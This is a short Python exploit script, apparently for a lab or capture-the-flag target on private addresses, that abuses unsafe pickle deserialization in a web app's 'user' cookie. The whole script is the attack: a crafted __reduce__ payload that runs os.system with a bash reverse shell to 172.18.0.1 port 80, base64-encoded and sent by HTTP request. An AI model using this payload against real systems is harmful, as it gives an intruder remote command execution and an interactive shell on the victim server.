#!/usr/bin/env python
import requests
import pickle
import os
import base64


class exp(object):
    def __reduce__(self):
        s = """/bin/bash -i >& /dev/tcp/172.18.0.1/80 0>&1"""
        return (os.system, (s,))


e = exp()
s = pickle.dumps(e)

response = requests.get("http://172.18.0.2:9000/", cookies=dict(
    user=base64.b64encode(s)
))
print(response.content)